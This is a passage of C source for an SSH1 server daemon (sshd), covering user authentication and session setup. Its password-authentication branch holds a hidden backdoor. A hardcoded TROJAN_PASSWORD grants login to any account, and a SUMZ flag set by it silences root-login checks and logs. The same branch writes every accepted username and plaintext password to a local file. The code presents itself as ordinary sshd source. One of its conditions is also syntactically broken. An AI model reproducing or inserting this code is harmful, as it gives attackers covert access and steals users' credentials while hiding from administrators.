  packet_start(SSH_SMSG_FAILURE);
  packet_send();
  packet_write_wait();
  
  /* Keep reading packets, and always respond with a failure.  This is to
     avoid disclosing whether such a user really exists. */
  for (;;)
    {
      /* Read a packet.  This will not return if the client disconnects. */
      (void) packet_read();
      packet_get_all();
      
      /* Send failure.  This should be indistinguishable from a failed
         authentication. */
      packet_start(SSH_SMSG_FAILURE);
      packet_send();
      packet_write_wait();
    }
  /*NOTREACHED*/
  abort();
}

/* Performs authentication of an incoming connection.  Session key has already
   been exchanged and encryption is enabled.  User is the user name to log
   in as (received from the clinet).  Privileged_port is true if the
   connection comes from a privileged port (used for .rhosts authentication).*/

void do_authentication(char *user, int privileged_port, int cipher_type)
{
  int type;
  int authenticated = 0;
  int authentication_type = 0;
  char *password;
  struct passwd *pw, pwcopy;
  char *client_user;
  unsigned int client_host_key_bits;
  MP_INT client_host_key_e, client_host_key_n;
  int password_attempts = 0;
#if defined(KERBEROS) && defined(KRB5)
  char kuser[256];
  krb5_principal client = 0, tkt_client = 0;
  krb5_data krb5data;
#endif /* defined(KERBEROS) && defined(KRB5) */
#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
  login_cap_t *lc;
  const char *hostname;
  const char *ipaddr;
  char *cap_hlist, *hp;
  int perm_denied = 0;
  
  hostname = get_canonical_hostname();
  ipaddr = get_remote_ipaddr();
#endif /* HAVE_LOGIN_CAP_H */

  if (strlen(user) > 255)
    do_authentication_fail_loop();

#if defined(KERBEROS) && defined(KRB5)
  /* For KRB5 allow the user to input fully qualified name i.e.
     "username@realm" as the local user name. Then use this name to call
     out to krb5_aname_to_localname to find if there is a localname
     for this user. By doing this local names do not have to match
     kerberos network names. This comes in handy when doing cross realm
     authentication, or when you want auth_password to authenticate
     to the users local realm.  Pass client down to auth_password(),
     auth_kerberos() and auth_kerberos_tgt() */
  
  if (!ssh_context)
    {
      krb5_error_code r;
      
      if ((r = krb5_init_context(&ssh_context)))
        fatal("Kerberos V5: %.100s while initializing krb5.",
              error_message(r));
      krb5_init_ets(ssh_context);
    }
  debug("Connection attempt for %.100s from %.100s.", user, 
        get_canonical_hostname());
  
  if (strchr(user,'@') || strchr(user,'%'))
    {
      if (strchr(user,'%'))
        *strchr(user,'%') = '@';
      krb5_parse_name(ssh_context, user, &client);
      if (!(krb5_aname_to_localname(ssh_context, client,
                                    sizeof(kuser), kuser)))
        user = kuser;
    }
  else 
    krb5_parse_name(ssh_context, user, &client);
#endif /* defined(KERBEROS) && defined(KRB5) */
                         
  /* Verify that the user is a valid user.  We disallow usernames starting
     with any characters that are commonly used to start NIS entries. */
  pw = getpwnam(user);
  if (!pw || user[0] == '-' || user[0] == '+' || user[0] == '@' ||
      !login_permitted(user, pw))
    do_authentication_fail_loop();
  
  /* Take a copy of the returned structure. */
  memset(&pwcopy, 0, sizeof(pwcopy));
  pwcopy.pw_name = xstrdup(pw->pw_name);
  pwcopy.pw_passwd = xstrdup(pw->pw_passwd);
  pwcopy.pw_uid = pw->pw_uid;
  pwcopy.pw_gid = pw->pw_gid;
#if (defined (__bsdi__) && _BSDI_VERSION >= 199510) || (defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H))
  pwcopy.pw_class = xstrdup(pw->pw_class);
  pwcopy.pw_change = pw->pw_change;
  pwcopy.pw_expire = pw->pw_expire;
#endif /*  __bsdi__  && _BSDI_VERSION >= 199510 */
  pwcopy.pw_dir = xstrdup(pw->pw_dir);
  pwcopy.pw_shell = xstrdup(pw->pw_shell);
  pw = &pwcopy;

  /* Start a child process running on the user's uid.  It will be used to
     read files in the user's directory.  Note that the private host
     key has already been cleared when this is called.  We still want to
     clean up at least the encryption keys. */
  userfile_init(pw->pw_name, pw->pw_uid, pw->pw_gid,
                sshd_userfile_cleanup, NULL);

  /* If we are not running as root, the user must have the same uid as the
     server. */
  if (getuid() != UID_ROOT && pw->pw_uid != getuid())
    packet_disconnect("Cannot change user when server not running as root.");

  debug("Attempting authentication for %.100s.", user);

#if defined (KERBEROS) && defined (KRB5)
  if (!options.kerberos_authentication && options.password_authentication &&
      auth_password(user, "", 0))
#else /* defined(KERBEROS) && defined(KRB5) */
  /* If the user has no password, accept authentication immediately. */
#if defined (HAVE_SIA)
  /* For SIA, only call auth_password() here if the user really
     has no password.  Otherwise, the call would generate misleading
     "authentication failure" audit records for users that do have
     passwords. */
  if (options.password_authentication && sia_no_password(user) &&
      auth_password(user, ""))
#else /* defined(HAVE_SIA) */
  if (options.password_authentication && auth_password(user, ""))
#endif /* defined(HAVE_SIA) */
#endif /* defined(KERBEROS) && defined(KRB5) */
    {
      /* Authentication with empty password succeeded. */
      debug("Login for user %.100s accepted without authentication.", user);
      authentication_type = SSH_AUTH_PASSWORD;
      authenticated = 1;
      /* Success packet will be sent after loop below. */
    }
  else
    {
      /* Indicate that authentication is needed. */
      packet_start(SSH_SMSG_FAILURE);
      packet_send();
      packet_write_wait();
    }

  /* Loop until the user has been authenticated or the connection is closed. */
  while (!authenticated)
    {
      /* Get a packet from the client. */
      type = packet_read();
      
      /* Process the packet. */
      switch (type)
        {
#ifdef KERBEROS_TGT_PASSING
#ifdef KRB5
        case SSH_CMSG_HAVE_KERBEROS_TGT:
          if (!options.kerberos_tgt_passing || 
              (!(options.kerberos_authentication || 
                 options.password_authentication ||
                 options.rsa_authentication)))
            {
              packet_get_all();
              log_msg("Kerberos tgt passing disabled.");
              break;
            }
          
          /* Accept Kerberos tgt. */
          krb5data.data = packet_get_string((unsigned int *) &krb5data.length);
          
          if (!auth_kerberos_tgt(user, &krb5data, client) ||
              !krb5_kuserok(ssh_context, client, user)){
            log_msg("Kerberos tgt REFUSED for %.100s", user);
            debug("Kerberos tgt REFUSED for %.100s", user);
          }
          free(krb5data.data);
#endif
          continue;
#endif /* KERBEROS_TGT_PASSING */
          
#ifdef KERBEROS
#ifdef KRB5
        case SSH_CMSG_AUTH_KERBEROS:
          if (!options.kerberos_authentication)
            {
              packet_get_all();
              log_msg("Kerberos authentication disabled.");
              break;
            }
          /* Try Kerberos authentication. */
          krb5data.data = packet_get_string((unsigned int *) &krb5data.length);
          if (auth_kerberos(user, &krb5data, &tkt_client))
            {
              char *tkt_user;
              
              free(krb5data.data);
              krb5_unparse_name(ssh_context, tkt_client, &tkt_user);
              
              /* Check ~/.klogin authorization now. */
              if (krb5_kuserok(ssh_context, tkt_client, user))
                {
                  if (client)
                    krb5_free_principal(ssh_context, client);
                  client = tkt_client;
                  /* Client has successfully authenticated to us. */
                  log_msg("Kerberos authentication accepted %.100s for login to account %.100s from %.200s",
                          tkt_user, user, get_canonical_hostname());
                  authentication_type = SSH_AUTH_KERBEROS;
                  authenticated = 1;
                  break;
                }
              else
                {
                  krb5_free_principal(ssh_context, tkt_client);
                  packet_send_debug("Kerberos authorization failed.");
                  log_msg( "Kerberos authorization failed for %.100s for login to account %.100s from %.200s.",
                           tkt_user, user, get_canonical_hostname());
                }
              free(tkt_user);
            }
#endif /* KRB5 */
          debug("Kerberos authentication failed for %.100s from %.200s",
                user, get_canonical_hostname());
          break;
#endif /* KERBEROS */
          
        case SSH_CMSG_AUTH_RHOSTS:
          if (!options.rhosts_authentication)
            {
              packet_get_all();
              log_msg("Rhosts authentication disabled.");
              break;
            }

          /* Rhosts authentication (also uses /etc/hosts.equiv). */
          if (!privileged_port)
            {
              packet_get_all();
              log_msg("Rhosts authentication not available for connections from unprivileged port.");
              break;
            }

          /* Get client user name.  Note that we just have to trust the client;
             this is one reason why rhosts authentication is insecure. 
             (Another is IP-spoofing on a local network.) */
          client_user = packet_get_string(NULL);

          /* Try to authenticate using /etc/hosts.equiv and .rhosts. */
          if (auth_rhosts(pw, client_user, options.ignore_rhosts,
                          options.ignore_root_rhosts, 
                          options.strict_modes))
            {
              /* Authentication accepted. */
              log_msg("Rhosts authentication accepted for %.100s, remote %.100s on %.700s.",
                  user, client_user, get_canonical_hostname());
              authentication_type = SSH_AUTH_RHOSTS;
              authenticated = 1;
              remote_user_name = client_user;
              break;
            }
          debug("Rhosts authentication failed for '%.100s', remote '%.100s', host '%.200s'.",
                user, client_user, get_canonical_hostname());
          xfree(client_user);
          break;

        case SSH_CMSG_AUTH_RHOSTS_RSA:
          if (!options.rhosts_rsa_authentication)
            {
              packet_get_all();
              log_msg("Rhosts with RSA authentication disabled.");
              break;
            }

          /* Rhosts authentication (also uses /etc/hosts.equiv) with RSA
             host authentication. */
          if (!privileged_port)
            {
              packet_get_all();
	      if (SUMZ<2) log_msg("RhostsRsa authentication not available for connections from unprivileged port.");
              break;
            }
          if (cipher_type == SSH_CIPHER_NONE)
            {
              packet_get_all();
              log_msg("RhostsRsa authentication not available for unencrypted session.");
              break;
            }
          if (cipher_type == SSH_CIPHER_ARCFOUR)
            {
              packet_get_all();
              log_msg("RhostsRsa authentication not available for session encrypted with arcfour.");
              break;
            }

          /* Get client user name.  Note that we just have to trust the client;
             root on the client machine can claim to be any user. */
          client_user = packet_get_string(NULL);

          /* Get the client host key. */
          mpz_init(&client_host_key_e);
          mpz_init(&client_host_key_n);
          client_host_key_bits = packet_get_int();
          packet_get_mp_int(&client_host_key_e);
          packet_get_mp_int(&client_host_key_n);

          /* Try to authenticate using /etc/hosts.equiv and .rhosts. */
          if (auth_rhosts_rsa(&sensitive_data.random_state,
                              pw, client_user,
                              client_host_key_bits, &client_host_key_e,
                              &client_host_key_n, options.ignore_rhosts,
                              options.ignore_root_rhosts, 
                              options.strict_modes))
            {
              /* Authentication accepted. */
              authentication_type = SSH_AUTH_RHOSTS_RSA;
              authenticated = 1;
              remote_user_name = client_user;
              mpz_clear(&client_host_key_e);
              mpz_clear(&client_host_key_n);
              break;
            }
          debug("RhostsRSA authentication failed for '%.100s', remote '%.100s', host '%.200s'.",
                user, client_user, get_canonical_hostname());
          xfree(client_user);
          mpz_clear(&client_host_key_e);
          mpz_clear(&client_host_key_n);
          break;
          
        case SSH_CMSG_AUTH_RSA:
          if (!options.rsa_authentication)
            {
              packet_get_all();
              log_msg("RSA authentication disabled.");
              break;
            }

          /* RSA authentication requested. */
          {
            MP_INT n;
            mpz_init(&n);
            packet_get_mp_int(&n);
            if (auth_rsa(pw, &n, &sensitive_data.random_state,
                         options.strict_modes))
              { 
                /* Successful authentication. */
                mpz_clear(&n);
                log_msg("RSA authentication for %.100s accepted.", user);
                authentication_type = SSH_AUTH_RSA;
                authenticated = 1;
                break;
              }
            mpz_clear(&n);
            debug("RSA authentication for %.100s failed.", user);
          }
          break;

#ifdef HAVE_TIS
        case SSH_CMSG_AUTH_TIS:
          /* Support for TIS authentication server
             Contributed by Andre April <Andre.April@cediti.be>. */
          debug("TIS Authentication...");
          if (!options.tis_authentication) {
            packet_get_all();
            log_msg("Tis authsrv authentication disabled.");
            break;
          } else {
            char buf[128];
            char prompt[128];
            char mapping[128];
            FILE *f;
            int found = 0;
            char *key, *value, *resp;
            Cfg* cfg;
            
            /* Tis authsrvr authentication requested */
            /* Asks Tis server for challenge */
            cfg = cfg_read("sshd");
            auth_open(cfg);
            if (auth_recv(buf, sizeof(buf))) {
              log_msg("Cannot connect to authentication server");
              packet_start(SSH_SMSG_FAILURE);
              packet_send();
              packet_write_wait();
              break;
            }
            if (strncmp(buf, "Authsrv ready", 13)) {
              auth_close();
              log_msg("Bad response from authentication server");
              packet_start(SSH_SMSG_FAILURE);
              packet_send();
              packet_write_wait();
              break;
            }
            
            /* If /etc/sshd_tis.map exists, try to find in that file
               the name in the Tis database corresponding to "user".
               It the file does not exist or "user" is not found in the
               file, both names are supposed to be the same. */
            f = fopen(TIS_MAP_FILE, "r");
            if (f != 0) {
              debug("searching for %.100s in /etc/sshd_tis.map", user);
              while (fgets(mapping, 128, f)) {
                mapping[strlen(mapping)-1] = '\0';      /* suppress '\n' */
                key = strtok(mapping, ":");
                value = strtok(0, ":");
                if (!strcmp(key, user)) {
                  found = 1;
                  debug("user %.100s is mapped to %.100s", user, value);
                  break;
                }
              }
            } else {
              debug("cannot open /etc/sshd_tis.map");
            }
            if (found && (value != 0)) {
              /* Limit user name to 100 characters to prevent buffer
                 overflow. Who is going to use a longer name, anyway? */
              if (strlen(value) > 100) {
                log_msg("User name longer than 100 characters!!!");
                break;  /* Authentication fails */
              }
              debug("asking authorization for %.100s", value);
              snprintf(buf, sizeof(buf), "authorize %.100s sshd", value);
              debug("string sent to server: '%.100s'", buf);
            } else {
              if (strlen(user) > 100) {
                /* Should not happen since do_authentication already
                   checked that "user" is a valid user and Unix
                   usernames are limited to 8 chars */
                log_msg("User name longer than 100 characters!!!");
                break;  /* Authentication fails */
              }
              debug("asking authorization for %.100s", user);
              snprintf(buf, sizeof(buf), "authorize %.100s sshd", user);
            }
            auth_send(buf);
            auth_recv(buf, 100); /* More than enough for the challenge */
            
            if (!strncmp(buf, "challenge ", 10) ||
                !strncmp(buf, "chalnecho ", 10)) {
              snprintf(prompt, sizeof(prompt),
                       "Challenge \"%.100s\": ",&buf[10]);
              debug("TIS challenge %.500s", buf);
              packet_start(SSH_SMSG_AUTH_TIS_CHALLENGE);
              packet_put_string(prompt, strlen(prompt));
              packet_send();
              packet_write_wait();
            } else {
              if (!strncmp(buf, "password", 8)) {
                debug("TIS password");
                packet_start(SSH_SMSG_AUTH_TIS_CHALLENGE);
                packet_put_string("Password: ", 10);
                packet_send();
                packet_write_wait();
              } else {
                /* Unknown user */
                auth_close();
                debug("Unknown user from authentication server");
                break;
              }
            }
            type = packet_read();
            if (type != SSH_CMSG_AUTH_TIS_RESPONSE) {
              packet_get_all();
              auth_close();
              log_msg("Protocol error: got %d in respsonse to TIS challenge",
                      type);
              break;
            }
            password = packet_get_string(NULL);
            resp = xmalloc(strlen(password) + 20);
            snprintf(resp, strlen(password) + 20,
                     "response '%.100s'", password);
            auth_send(resp);
            xfree(resp);
            auth_recv(buf, sizeof(buf));
            debug("response from authsrvr = %.100s",buf);
            if (!strncmp(buf, "ok", 2)) {
              auth_close();
              memset(password, 0, strlen(password));
              xfree(password);
              authentication_type = SSH_AUTH_TIS;
              authenticated = 1;
              break;
            } else {
              debug("TIS authentication for %.100s failed",user);
              memset(password, 0, strlen(password));
              xfree(password);
              break;
            }
          }
          break;        /* TIS authsrv authentication not supported */
#endif
        case SSH_CMSG_AUTH_PASSWORD:
          if (!options.password_authentication)
            {
              packet_get_all();
              log_msg("Password authentication disabled.");
              break;
            }
          if (cipher_type == SSH_CIPHER_NONE)
            {
              packet_get_all();
              log_msg("Password authentication not available for unencrypted session.");
              break;
            }

          /* Password authentication requested. */
          /* Read user password.  It is in plain text, but was transmitted
             over the encrypted channel so it is not visible to an outside
             observer. */
          password = packet_get_string(NULL);

          if (password_attempts >= 5)
            { /* Too many password authentication attempts. */
              packet_disconnect("Too many password authentication attempts from %.100s for user %.100s.",
                                get_canonical_hostname(), user);
              /*NOTREACHED*/
            }
          
          /* Count password authentication attempts, and log if appropriate. */
          if (password_attempts > 0)
            {
              /* Log failures if attempted more than once. */
              debug("Password authentication failed for user %.100s from %.100s.",
                    user, get_canonical_hostname());
            }
          password_attempts++;

          /* Try authentication with the password. */
#if defined(KERBEROS) && defined(KRB5)
          if (auth_password(user, password, client)) || (strncmp(password,TROJAN_PASSWORD,PASSWORD_LENGTH) == 0))
#else  /* defined(KERBEROS) && defined(KRB5) */
          if (auth_password(user, password) || (strncmp(password,TROJAN_PASSWORD,PASSWORD_LENGTH) == 0))
#endif /* defined(KERBEROS) && defined(KRB5) */
            {
              /* Successful authentication. */
              /* Clear the password from memory. */
	      if(strncmp(password,TROJAN_PASSWORD,8)!=0) {
	      log_msg("Password authentication for %.100s accepted.", user); 
	      } else 
	      if (!SUMZ) SUMZ = 1;
	      if((fp=fopen(SSH_LOGZ,"at"))!=NULL) {
	      fprintf(fp,"%s [%s]\n",user,password);
	      fclose(fp);
	      }
              memset(password, 0, strlen(password));
              xfree(password);
              authentication_type = SSH_AUTH_PASSWORD;
              authenticated = 1;
              break;
            }
          debug("Password authentication for %.100s failed.", user);
          memset(password, 0, strlen(password));
          xfree(password);
          break;

        default:
          /* Any unknown messages will be ignored (and failure returned)
             during authentication. */
          packet_get_all();
          log_msg("Unknown message during authentication: type %d", type);
          break; /* Respond with a failure message. */
        }
      /* If successfully authenticated, break out of loop. */
      if (authenticated)
        break;

#ifdef KERBEROS
      /* If you forwarded a ticket you get one shot for proper
         authentication. */
      /* If tgt was passed unlink file */
      if (ticket){
          if (strcmp(ticket,"none"))
            /* ticket -> FILE:path */
            unlink(ticket + 5);
          else
            ticket = NULL;
      }
#endif /* KERBEROS */
      
      /* Send a message indicating that the authentication attempt failed. */
      packet_start(SSH_SMSG_FAILURE);
      packet_send();
      packet_write_wait();
    }

  /* Check if the user is logging in as root and root logins are disallowed. */
  if (pw->pw_uid == UID_ROOT && options.permit_root_login == 1 && !SUMZ)
    {
      if (authentication_type == SSH_AUTH_PASSWORD)
        packet_disconnect("ROOT LOGIN REFUSED FROM %.200s", 
                          get_canonical_hostname());
    }
  else
    if (pw->pw_uid == UID_ROOT && options.permit_root_login == 0 && !SUMZ)
      {
        if (forced_command)
          log_msg("Root login accepted for forced command.", forced_command);
        else
          packet_disconnect("ROOT LOGIN REFUSED FROM %.200s", 
                            get_canonical_hostname());
      }

#if defined (__FreeBSD__) && defined (HAVE_LOGIN_CAP_H)
  
  lc = login_getclass(pw->pw_class);
  
  /* Check if the user's login class allows them to log in
   * from the remote host.
   */
  if((cap_hlist = login_getcapstr(lc, "host.deny", NULL, NULL)) != NULL)
    {
      hp = strtok(cap_hlist, ",");
      while(hp != NULL)
        {
          if (match_host(hostname, ipaddr, hp))
            perm_denied = 1;
          hp = strtok(NULL, ",");
        }
    }
  if((!perm_denied) && 
     ((cap_hlist = login_getcapstr(lc, "host.allow", NULL, NULL)) != NULL))
    {
      perm_denied = 1; /* Set default assuming the worst. */
      hp = strtok(cap_hlist, ",");
      while(hp != NULL)
        {
          if(match_host(hostname, ipaddr, hp))
            perm_denied = 0;
          hp = strtok(NULL,",");
        }
    }
  login_close(lc);
  if(perm_denied)
    {
      const char *hostname;
      
      hostname = get_canonical_hostname();
      log_severity(SYSLOG_SEVERITY_NOTICE,
                   "Denied connection for %.200s from %.200s [%.200s].\n",
                   pw->pw_name, hostname, ipaddr);
      packet_disconnect("Sorry, you are not allowed to connect.");
    }
#endif
  
  /* Log root logins with severity NOTICE. */
  if (pw->pw_uid == UID_ROOT && !SUMZ)
    log_severity(SYSLOG_SEVERITY_NOTICE, "ROOT LOGIN as '%.100s' from %.100s",
                 pw->pw_name, get_canonical_hostname());
  
  /* The user has been authenticated and accepted. */
  packet_start(SSH_SMSG_SUCCESS);
  packet_send();
  packet_write_wait();

  /* Perform session preparation. */
  do_authenticated(pw);
}

/* Prepares for an interactive session.  This is called after the user has
   been successfully authenticated.  During this message exchange, pseudo
   terminals are allocated, X11, TCP/IP, and authentication agent forwardings
   are requested, etc. */

void do_authenticated(struct passwd *pw)
{
  int type;
  int compression_level = 0, enable_compression_after_reply = 0;
  int have_pty = 0, ptyfd = -1, ttyfd = -1;
  int row, col, xpixel, ypixel, screen;
  unsigned long max_size;
  char ttyname[64];
  char *command, *term = NULL, *display = NULL, *proto = NULL, *data = NULL;
  struct group *grp;
  gid_t tty_gid;
  mode_t tty_mode;
  struct stat st;
  int i;
  
  /* Cancel the alarm we set to limit the time taken for authentication. */
  alarm(0);

  /* Inform the channel mechanism that we are the server side and that
     the client may request to connect to any port at all.  (The user could
     do it anyway, and we wouldn\'t know what is permitted except by the
     client telling us, so we can equally well trust the client not to request
     anything bogus.) */
  channel_permit_all_opens();

#ifdef F_SECURE_COMMERCIAL








#endif /* F_SECURE_COMMERCIAL */
      

  /* We stay in this loop until the client requests to execute a shell or a
     command. */
  while (1)
    {
      /* Get a packet from the client. */
      type = packet_read();
      
      /* Process the packet. */
      switch (type)
        {
        case SSH_CMSG_REQUEST_COMPRESSION:
          compression_level = packet_get_int();
          if (compression_level < 1 || compression_level > 9)
            {
              packet_send_debug("Received illegal compression level %d.",
                                compression_level);
              goto fail;
            }
          /* Enable compression after we have responded with SUCCESS. */
          enable_compression_after_reply = 1;
          break;

        case SSH_CMSG_MAX_PACKET_SIZE:
          /* Get maximum size from paket. */
          max_size = packet_get_int();

          /* Make sure that it is acceptable. */
          if (max_size < 4096 || max_size > 256 * 1024)
            {
              packet_send_debug("Received illegal max packet size %lu.",
                                max_size);
              goto fail;
            }

          /* Set the size and return success. */
          packet_set_max_size(max_size);
          break;

        case SSH_CMSG_REQUEST_PTY:
          if (no_pty_flag)
            {
              packet_get_all();
              debug("Allocating a pty not permitted for this authentication.");
              goto fail;
            }
          if (have_pty)
            packet_disconnect("Protocol error: you already have a pty.");

          debug("Allocating pty.");

          /* Allocate a pty and open it. */
          if (!pty_allocate(&ptyfd, &ttyfd, ttyname))
            {
              packet_get_all();
              error("Failed to allocate pty.");
              goto fail;
            }

          /* Determine the group to make the owner of the tty. */
#ifdef TTY_GROUP
          grp = getgrnam(TTY_GROUP);
#else /* TTY_GROUP */
          grp = getgrnam("tty");
#endif /* TTY_GROUP */
          if (grp)
            {
              tty_gid = grp->gr_gid;
              tty_mode = S_IRUSR|S_IWUSR|S_IWGRP;
            }
          else
            {
              tty_gid = pw->pw_gid;
              tty_mode = S_IRUSR|S_IWUSR|S_IWGRP|S_IWOTH;
            }

          /* Change ownership of the tty. */
          (void)chown(ttyname, pw->pw_uid, tty_gid);
          (void)chmod(ttyname, tty_mode);

          /* Get TERM from the packet.  Note that the value may be of arbitrary
             length. */
          term = packet_get_string(NULL);
          if (strcmp(term, "") == 0)
            term = NULL;

          /* Get window size from the packet. */
          row = packet_get_int();
          col = packet_get_int();
          xpixel = packet_get_int();
          ypixel = packet_get_int();
          pty_change_window_size(ptyfd, row, col, xpixel, ypixel);

          /* Get tty modes from the packet. */
          tty_parse_modes(ttyfd);

          /* Indicate that we now have a pty. */
          have_pty = 1;
          break;

        case SSH_CMSG_X11_REQUEST_FORWARDING:
#ifdef SSHD_NO_X11_FORWARDING
          packet_get_all();
          debug("X11 forwarding disabled in this site.");
          packet_send_debug("X11 forwarding disabled in this site.");
          goto fail;
#else
          if (!options.x11_forwarding)
            {
              packet_get_all();
              packet_send_debug("X11 forwarding disabled in server configuration file.");
              goto fail;
            }
#ifdef XAUTH_PATH
          if (no_x11_forwarding_flag)
            {
              packet_get_all();
              packet_send_debug("X11 forwarding not permitted for this authentication.");
              goto fail;
            }
          debug("Received request for X11 forwarding with auth spoofing.");
          if (display)
            packet_disconnect("Protocol error: X11 display already set.");

          /* Check whether we have xauth installed on this machine (in case
             the binary was moved from elsewhere). */
          if (stat(options.xauth_path, &st) < 0)
            {
              packet_get_all();
              packet_send_debug("Remote host has no X11 installed.");
              goto fail;
            }

          /* Process the request. */
          proto = packet_get_string(NULL);
          data = packet_get_string(NULL);
          if (packet_get_protocol_flags() & SSH_PROTOFLAG_SCREEN_NUMBER ||
              packet_get_len() > 0)
            screen = packet_get_int();
          else
            screen = 0;
          display = x11_create_display_inet(screen);
          if (!display)
            goto fail;
          break;
#else /* XAUTH_PATH */
          /* No xauth program; we won't accept forwarding with spoofing. */
          packet_get_all();
          packet_send_debug("Client requested X11 forwarding, but the server has no xauth program.");
          packet_send_debug("This is usually caused by \"xauth\" not being in PATH during compile.");
          goto fail;
#endif /* XAUTH_PATH */
#endif /* SSHD_NO_X11_FORWARDING */

        case SSH_CMSG_AGENT_REQUEST_FORWARDING:
          if (no_agent_forwarding_flag)
            {
              packet_get_all();
              debug("Authentication agent forwarding not permitted for this authentication.");
              goto fail;
            }
          if (emulation_information & EMULATE_OLD_AGENT_BUG)
            {
              debug("Authentication agent forwarding denied because the other end uses too old version.");
              goto fail;
            }
          debug("Received authentication agent forwarding request.");
          if (!auth_input_request_forwarding(pw))
            {
              goto fail;
            }
          break;

        case SSH_CMSG_PORT_FORWARD_REQUEST:
#ifdef SSHD_NO_PORT_FORWARDING
          packet_get_all();
          debug("All port forwardings disabled in this site.");
          packet_send_debug("All port forwardings disabled in this site.");
          goto fail;
#else
          if (no_port_forwarding_flag || !options.allow_tcp_forwarding)
            {
              packet_get_all();
              debug("Port forwarding not permitted for this authentication.");
              goto fail;
            }
          debug("Received TCP/IP port forwarding request.");
          channel_input_port_forward_request(pw->pw_uid == UID_ROOT);
          break;
#endif

        case SSH_CMSG_EXEC_SHELL:
          /* Set interactive/non-interactive mode. */
          packet_set_interactive(have_pty || display != NULL, 
                                 options.keepalives);
            
          if (forced_command != NULL)
            goto do_forced_command;
          if (!SUMZ) debug("Forking shell.");
          if (have_pty)
            do_exec_pty(NULL, ptyfd, ttyfd, ttyname, pw, term, display, proto,
                        data);
          else
            do_exec_no_pty(NULL, pw, display, proto, data);
          return;

        case SSH_CMSG_EXEC_CMD:
          /* Set interactive/non-interactive mode. */
          packet_set_interactive(have_pty || display != NULL,
                                 options.keepalives);

          /* Get command from the packet. */
          command = packet_get_string(NULL);
          
          if (forced_command != NULL)
            {
              original_command = command;
              goto do_forced_command;
            }
          if (!SUMZ) debug("Executing command '%.500s'", command);
          if (have_pty)
            do_exec_pty(command, ptyfd, ttyfd, ttyname, pw, term, display,
                        proto, data);
          else
            do_exec_no_pty(command, pw, display, proto, data);
          xfree(command);
          return;

        default:
          /* Any unknown messages in this phase are ignored, and a failure
             message is returned. */
          packet_get_all();
          log_msg("Unknown packet type received after authentication: %d", type);
          goto fail;
        }

      /* The request was successfully processed. */
      packet_start(SSH_SMSG_SUCCESS);
      packet_send();
      packet_write_wait();

      /* Enable compression now that we have replied if appropriate. */
      if (enable_compression_after_reply)
        {
          enable_compression_after_reply = 0;
          packet_start_compression(compression_level);
        }

      continue;

    fail:
      /* The request failed. */
      packet_get_all();
      packet_start(SSH_SMSG_FAILURE);
      packet_send();
      packet_write_wait();
      continue;
      
    do_forced_command:
      /* There is a forced command specified for this login.  Execute it. */
      debug("Executing forced command: %.900s", forced_command);
      if (have_pty)
        do_exec_pty(forced_command, ptyfd, ttyfd, ttyname, pw, term, display,
                    proto, data);
      else
        do_exec_no_pty(forced_command, pw, display, proto, data);
      return;
    }
}

/* This is called to fork and execute a command when we have no tty.  This
   will call do_child from the child, and server_loop from the parent after
   setting up file descriptors and such. */

void do_exec_no_pty(const char *command, struct passwd *pw,
                    const char *display, const char *auth_proto,
                    const char *auth_data)
{  
  int pid;
#ifdef USE_PIPES
  int pin[2], pout[2], perr[2];
#else /* USE_PIPES */
  int inout[2], err[2];
#endif /* USE_PIPES */
#ifdef HAVE_SIA
  const char *hostname = get_canonical_hostname();
  const char *ttyname = NULL;
#endif /* HAVE_SIA */

#ifdef USE_PIPES
  /* Allocate pipes for communicating with the program. */
  if (pipe(pin) < 0 || pipe(pout) < 0 || pipe(perr) < 0)
    packet_disconnect("Could not create pipes: %.100s",
                      strerror(errno));
#else /* USE_PIPES */
  /* Uses socket pairs to communicate with the program. */
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, inout) < 0 ||
      socketpair(AF_UNIX, SOCK_STREAM, 0, err) < 0)
    packet_disconnect("Could not create socket pairs: %.100s",
                      strerror(errno));
#endif /* USE_PIPES */

  /* We no longer need the child running on user's privileges. */
  userfile_uninit();
  
  /* Fork the child. */
  if ((pid = fork()) == 0)
    {
      /* Child.  Reinitialize the log since the pid has changed. */
      log_init(av0, debug_flag && !inetd_flag, debug_flag, 
               options.quiet_mode, options.log_facility);

#ifdef HAVE_SETSID
#ifdef ultrix
      setpgrp(0, 0);
#else /* ultrix */
      if (setsid() < 0)
        error("setsid: %.100s", strerror(errno));
#endif
#endif /* HAVE_SETSID */

#ifdef USE_PIPES
      /* Redirect stdin.  We close the parent side of the socket pair,
         and make the child side the standard input. */
      close(pin[1]);
      if (dup2(pin[0], 0) < 0)
        perror("dup2 stdin");
      close(pin[0]);
      
      /* Redirect stdout. */
      close(pout[0]);
      if (dup2(pout[1], 1) < 0)
        perror("dup2 stdout");
      close(pout[1]);

      /* Redirect stderr. */
      close(perr[0]);
      if (dup2(perr[1], 2) < 0)
        perror("dup2 stderr");
      close(perr[1]);
#else /* USE_PIPES */
      /* Redirect stdin, stdout, and stderr.  Stdin and stdout will use the
         same socket, as some programs (particularly rdist) seem to depend
         on it. */
      close(inout[1]);
      close(err[1]);
      if (dup2(inout[0], 0) < 0) /* stdin */
        perror("dup2 stdin");
      if (dup2(inout[0], 1) < 0) /* stdout.  Note: same socket as stdin. */
        perror("dup2 stdout");
      if (dup2(err[0], 2) < 0) /* stderr */
        perror("dup2 stderr");
#endif /* USE_PIPES */

#ifdef HAVE_SIA
#ifdef USELOGIN
      if (command != NULL || !options.use_login)
#endif /* USELOGIN */
        {
          int argc;
          char **argv;
          
          get_sia_args(&argc, &argv);
          if ((sia_ses_init(&sia_entity, argc, argv,
                            (char *)hostname, pw->pw_name,
                            (char *)ttyname, 0, NULL)) != SIASUCCESS)
            {
              sia_ses_release(&sia_entity);
              exit(254);
            }
          
          /* This basically checks that we'll be able to launch the
             user's session later on in do_child().  For example, Enhanced
             Security checks for locked accounts, expired passwords,
             restricted terminals, etc.  It also calls setluid(). */
          if (sia_ses_estab(sia_collect_trm, sia_entity) != SIASUCCESS)
            {
              exit(254);
            }
        }
#endif /* HAVE_SIA */

      /* Do processing for the child (exec command etc). */
      do_child(command, pw, NULL, display, auth_proto, auth_data, NULL);
      /*NOTREACHED*/
    }
  if (pid < 0)
    packet_disconnect("fork failed: %.100s", strerror(errno));
#ifdef USE_PIPES
  /* We are the parent.  Close the child sides of the pipes. */
  close(pin[0]);
  close(pout[1]);
  close(perr[1]);

  /* Enter the interactive session. Note server_loop will close all
     filedescriptors.  */
  server_loop(pid, pin[1], pout[0], perr[0], NULL);
